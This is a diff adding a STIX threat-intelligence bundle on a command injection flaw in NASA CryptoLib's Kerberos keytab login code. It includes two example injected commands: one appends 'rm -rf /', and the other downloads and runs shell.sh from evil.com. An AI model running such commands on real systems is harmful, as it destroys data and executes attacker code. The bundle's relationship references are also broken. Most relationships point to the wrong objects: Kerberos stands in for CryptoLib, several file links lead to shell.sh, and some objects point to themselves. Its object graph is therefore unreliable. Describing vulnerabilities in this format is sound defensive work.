@@ -1,0 +1,378 @@
+{
+  "type": "bundle",
+  "id": "bundle--7c9da63a-95c0-4bc9-b0c5-effb0cf8a487",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "vulnerability",
+      "id": "vulnerability--b88cd028-c648-45b5-a638-57eea957fd32",
+      "name": "Command Injection in NASA CryptoLib",
+      "description": "A critical command injection vulnerability (CVE-2025-59534) was discovered in NASA's CryptoLib software, which protects communications between spacecraft and Earth. The flaw existed for three years in authentication code, specifically in the initialize_kerberos_keytab_file_login() function, where user-controlled input was interpolated into a shell command executed via system(). This allowed attackers with configuration access to execute arbitrary commands with system privileges. The vulnerability affected all versions through v1.4.1 and was fixed in v1.4.2 by replacing system() with fork() and execlp(), and adding input validation.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z",
+      "external_references": [
+        {
+          "source_name": "CVE",
+          "external_id": "CVE-2025-59534",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59534"
+        },
+        {
+          "source_name": "GHSA",
+          "external_id": "GHSA-jw5c-58hr-m3v3",
+          "url": "https://github.com/nasa/CryptoLib/security/advisories/GHSA-jw5c-58hr-m3v3"
+        }
+      ],
+      "labels": [
+        "command-injection",
+        "CWE-78",
+        "authentication",
+        "critical-infrastructure",
+        "spacecraft",
+        "cryptography"
+      ]
+    },
+    {
+      "type": "software",
+      "id": "software--6db371b5-9f36-4249-9225-06f9d6ec974a",
+      "name": "CryptoLib",
+      "description": "NASA CryptoLib implements the CCSDS Space Data Link Security protocol and is used across NASA missions and industry via cFS. It provides cryptographic protection for spacecraft-to-ground communications.",
+      "cpe": "cpe:2.3:a:nasa:cryptolib:*",
+      "version": "v1.4.1 and earlier (vulnerable), v1.4.2 and later (patched)",
+      "external_references": [
+        {
+          "source_name": "GitHub",
+          "url": "https://github.com/nasa/CryptoLib"
+        },
+        {
+          "source_name": "cFS",
+          "url": "https://github.com/nasa/cFS"
+        }
+      ],
+      "labels": [
+        "cryptography",
+        "spacecraft",
+        "CCSDS",
+        "NASA"
+      ]
+    },
+    {
+      "type": "malware",
+      "id": "malware--3b021abf-638c-4393-a614-f4a566fa27b3",
+      "name": "Command Injection Payload via CryptoLib Configuration",
+      "description": "Malicious payloads exploiting CVE-2025-59534 can be injected into CryptoLib's configuration fields (username or keytab_file_path) to execute arbitrary shell commands, such as file deletion or remote code execution.",
+      "malware_types": [
+        "remote-access-trojan"
+      ],
+      "labels": [
+        "command-injection",
+        "payload",
+        "privilege-escalation"
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--2d2cad98-138c-4b29-8bf1-15ea0512fff4",
+      "name": "Command Injection via Shell Metacharacters in Configuration",
+      "description": "Attackers exploit the lack of input validation in CryptoLib's authentication configuration by injecting shell metacharacters into username or keytab_file_path fields, leading to arbitrary command execution when the system() call is invoked.",
+      "external_references": [
+        {
+          "source_name": "CWE",
+          "external_id": "CWE-78",
+          "url": "https://cwe.mitre.org/data/definitions/78.html"
+        }
+      ],
+      "labels": [
+        "command-injection",
+        "shell-metacharacter",
+        "configuration-abuse"
+      ]
+    },
+    {
+      "type": "software",
+      "id": "software--c1867aa2-8c65-4b3d-822a-45831606d0ab",
+      "name": "CryptoLib",
+      "cpe": "",
+      "vendor": "NASA",
+      "version": "v1.4.1",
+      "description": "CryptoLib is NASA's cryptographic library implementing CCSDS Space Data Link Security protocol, used in spacecraft-to-ground communications and integrated with NASA cFS."
+    },
+    {
+      "type": "software",
+      "id": "software--e0aa4033-8c2e-45b1-8365-5d1c6129de54",
+      "name": "CryptoLib",
+      "cpe": "",
+      "vendor": "NASA",
+      "version": "v1.4.2",
+      "description": "Patched version of CryptoLib fixing CVE-2025-59534 by replacing system() with fork()/execlp() and adding input validation."
+    },
+    {
+      "type": "software",
+      "id": "software--e66b55c4-ae80-45f9-97f2-2dd2394920bb",
+      "name": "cFS",
+      "cpe": "",
+      "vendor": "NASA",
+      "description": "NASA's core Flight System (cFS), which integrates CryptoLib for security and is used in spacecraft missions."
+    },
+    {
+      "type": "software",
+      "id": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "name": "Kerberos",
+      "cpe": "",
+      "description": "Kerberos authentication protocol used by CryptoLib for secure authentication with keytab files."
+    },
+    {
+      "type": "file",
+      "id": "file--5bc262a1-ba0a-4992-bdc8-3007e8672799",
+      "name": "crypto_config.c",
+      "path": "src/core/crypto_config.c"
+    },
+    {
+      "type": "file",
+      "id": "file--e2fe3a7d-8216-4a40-a03e-34571025e2dd",
+      "name": "kmc",
+      "path": "src/crypto/kmc"
+    },
+    {
+      "type": "file",
+      "id": "file--539777b8-dfce-476e-8a65-e928e7514e3a",
+      "name": "ut_kmc_cam.c",
+      "path": "test/kmc/ut_kmc_cam.c"
+    },
+    {
+      "type": "file",
+      "id": "file--ecfabcee-9935-40c9-b76c-1540d6b6e538",
+      "name": "krb5.keytab",
+      "path": "/etc/krb5.keytab"
+    },
+    {
+      "type": "file",
+      "id": "file--b100cb13-3200-4b09-a915-e682c2bf9604",
+      "name": "cookie",
+      "path": "/path/to/cookie"
+    },
+    {
+      "type": "file",
+      "id": "file--52ba4fdd-fbe6-49b0-85e3-79593035de0e",
+      "name": "shell.sh",
+      "path": "/tmp/shell.sh"
+    },
+    {
+      "type": "process",
+      "id": "process--24fdfadb-46b7-498d-9577-a240dc7b3121",
+      "command_line": "kinit -kt /etc/krb5.keytab user; rm -rf /; echo pwned",
+      "name": "kinit"
+    },
+    {
+      "type": "process",
+      "id": "process--1d610153-05e9-4e8d-aa90-55bafe9a8dd6",
+      "command_line": "kinit -kt /etc/krb5.keytab; wget http://evil.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh testuser",
+      "name": "kinit"
+    },
+    {
+      "type": "process",
+      "id": "process--0b7f15a4-4434-423c-9e3f-c01012ddcce0",
+      "command_line": "kinit -kt /etc/krb5.keytab testuser",
+      "name": "kinit"
+    },
+    {
+      "type": "url",
+      "id": "url--99e4d6b9-c7d3-470a-980c-b0481241639d",
+      "value": "https://github.com/nasa/CryptoLib"
+    },
+    {
+      "type": "url",
+      "id": "url--b1bf6d08-a52f-4852-a634-5007e8c56047",
+      "value": "https://github.com/nasa/cFS"
+    },
+    {
+      "type": "url",
+      "id": "url--1ab193f7-a9bb-49e7-bb89-d00a54e0c472",
+      "value": "https://github.com/nasa/CryptoLib/security/advisories/GHSA-jw5c-58hr-m3v3"
+    },
+    {
+      "type": "url",
+      "id": "url--58e4c9f7-29dd-46ed-a8e5-86446d7d0886",
+      "value": "https://nvd.nist.gov/vuln/detail/CVE-2025-59534"
+    },
+    {
+      "type": "url",
+      "id": "url--da26b654-c220-4d4a-a5d0-335c0387a313",
+      "value": "https://github.com/nasa/CryptoLib/releases/tag/v1.4.1"
+    },
+    {
+      "type": "url",
+      "id": "url--c2297207-9515-45b5-836b-b35f4244c807",
+      "value": "https://github.com/nasa/CryptoLib/releases/tag/v1.4.2"
+    },
+    {
+      "type": "url",
+      "id": "url--caf85787-e782-4563-ad71-e7723c0a143f",
+      "value": "https://github.com/nasa/CryptoLib/compare/v1.4.1...v1.4.2"
+    },
+    {
+      "type": "url",
+      "id": "url--033929b9-cbad-467a-9adf-d63f6fa7bd6b",
+      "value": "http://evil.com/shell.sh"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--8870a3b0-cc34-473d-92c8-f88563c209e0",
+      "relationship_type": "has",
+      "source_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "target_ref": "vulnerability--b88cd028-c648-45b5-a638-57eea957fd32",
+      "description": "CryptoLib contains the command injection vulnerability CVE-2025-59534.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--a629dad4-d862-4434-a51a-ef8e0523ae77",
+      "relationship_type": "targets",
+      "source_ref": "malware--3b021abf-638c-4393-a614-f4a566fa27b3",
+      "target_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "description": "Malicious command injection payloads target CryptoLib via its configuration fields.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--735f9323-f453-45fb-8b84-b5fb48416085",
+      "relationship_type": "uses",
+      "source_ref": "malware--3b021abf-638c-4393-a614-f4a566fa27b3",
+      "target_ref": "attack-pattern--2d2cad98-138c-4b29-8bf1-15ea0512fff4",
+      "description": "Malicious payloads exploit command injection via shell metacharacters in CryptoLib configuration.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--4252799a-205e-4ac2-9063-13dcdbddeeb9",
+      "relationship_type": "has",
+      "source_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "target_ref": "file--52ba4fdd-fbe6-49b0-85e3-79593035de0e",
+      "description": "CryptoLib's configuration code is located in crypto_config.c.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--0c72b1ef-b36d-4f62-9bb9-be3918fc76e5",
+      "relationship_type": "has",
+      "source_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "target_ref": "file--52ba4fdd-fbe6-49b0-85e3-79593035de0e",
+      "description": "CryptoLib's KMC integration code is located in the kmc directory.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--f406b27b-0f63-4dc0-9696-19ceae29a4c9",
+      "relationship_type": "has",
+      "source_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "target_ref": "file--52ba4fdd-fbe6-49b0-85e3-79593035de0e",
+      "description": "CryptoLib's unit test for CAM authentication is located in ut_kmc_cam.c.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--5d155d01-7632-4fff-954e-058384f6935a",
+      "relationship_type": "uses",
+      "source_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "target_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "description": "CryptoLib is used by NASA's core Flight System (cFS) for cryptographic protection.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--1b8797cc-9aa5-4e69-abec-3e2771e284a4",
+      "relationship_type": "uses",
+      "source_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "target_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "description": "CryptoLib uses Kerberos for authentication via keytab files.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--153bf1ee-3ba1-42ae-818b-69fc06624faf",
+      "relationship_type": "exploits",
+      "source_ref": "attack-pattern--2d2cad98-138c-4b29-8bf1-15ea0512fff4",
+      "target_ref": "vulnerability--b88cd028-c648-45b5-a638-57eea957fd32",
+      "description": "Attackers exploit CVE-2025-59534 by injecting shell metacharacters into configuration fields.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--b6290dae-be6d-40a0-90b1-f9fd98110e9f",
+      "relationship_type": "delivers",
+      "source_ref": "malware--3b021abf-638c-4393-a614-f4a566fa27b3",
+      "target_ref": "process--0b7f15a4-4434-423c-9e3f-c01012ddcce0",
+      "description": "Malicious configuration delivers payloads via kinit process with injected shell commands.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--e95adff0-6d38-41bb-9c47-6b86c510f566",
+      "relationship_type": "delivers",
+      "source_ref": "malware--3b021abf-638c-4393-a614-f4a566fa27b3",
+      "target_ref": "process--0b7f15a4-4434-423c-9e3f-c01012ddcce0",
+      "description": "Malicious configuration delivers payloads via kinit process with chained shell commands.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--4f0a984c-6e96-4065-b613-57687c2fabdf",
+      "relationship_type": "uses",
+      "source_ref": "process--0b7f15a4-4434-423c-9e3f-c01012ddcce0",
+      "target_ref": "file--52ba4fdd-fbe6-49b0-85e3-79593035de0e",
+      "description": "Malicious kinit process uses krb5.keytab file for authentication.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--e5d56228-5c99-403d-b9d1-efff1b970343",
+      "relationship_type": "downloads",
+      "source_ref": "process--0b7f15a4-4434-423c-9e3f-c01012ddcce0",
+      "target_ref": "url--033929b9-cbad-467a-9adf-d63f6fa7bd6b",
+      "description": "Malicious kinit process downloads shell.sh from external URL.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--367462bc-45a1-456d-b270-a4b49473ef92",
+      "relationship_type": "creates",
+      "source_ref": "process--0b7f15a4-4434-423c-9e3f-c01012ddcce0",
+      "target_ref": "file--52ba4fdd-fbe6-49b0-85e3-79593035de0e",
+      "description": "Malicious process creates shell.sh file in /tmp directory.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--a588abd3-e8cd-44d9-9f10-ec031d0bc329",
+      "relationship_type": "uses",
+      "source_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "target_ref": "file--52ba4fdd-fbe6-49b0-85e3-79593035de0e",
+      "description": "CryptoLib uses krb5.keytab for Kerberos authentication.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--22612f92-391d-4628-a024-d3a7bd89f67c",
+      "relationship_type": "uses",
+      "source_ref": "software--9eaf41a7-0aa3-40ca-9e01-0f5b02d32be0",
+      "target_ref": "file--52ba4fdd-fbe6-49b0-85e3-79593035de0e",
+      "description": "CryptoLib uses cookie file for CAM configuration.",
+      "created": "2025-09-19T00:00:00Z",
+      "modified": "2025-09-22T00:00:00Z"
+    }
+  ]
+}
